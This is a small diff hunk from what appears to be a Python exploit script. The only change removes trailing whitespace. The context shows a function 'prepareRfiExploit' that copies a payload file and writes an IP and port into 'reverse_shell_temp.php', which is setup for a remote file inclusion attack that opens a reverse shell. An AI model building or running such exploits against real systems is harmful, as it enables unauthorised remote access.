@@ -87,7 +87,7 @@ def prepareRfiExploit(payloadFile, temporaryFile, ip, port):
                 for line in lines:
                     line = line[:-1]
                     r.write(line + "\n")
-    
+
     #Modify reverse_shell_temp.php ip and port number values
     with(fileinput.FileInput(temporaryFile, inplace = True)) as file:
         for line in file:
